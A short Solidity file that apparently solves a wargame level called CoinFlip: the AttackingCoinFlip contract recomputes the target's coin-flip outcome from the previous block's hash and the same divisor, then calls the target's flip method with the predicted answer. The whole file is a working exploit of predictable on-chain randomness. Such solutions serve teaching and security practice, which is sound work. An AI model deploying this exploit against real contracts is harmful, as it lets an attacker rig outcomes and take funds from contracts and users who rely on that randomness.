// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

// create interface for OG contract and flip method to interact with
interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool);
}


contract AttackingCoinFlip {
    address public contractAddress;
    uint256 public lastHash;
    // use the same factor as the OG contract
    uint256 public factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / factor;

        // send the correct guess to the OG contract
        CoinFlipInterface(contractAddress).flip(coinFlip == 1);
    }
}
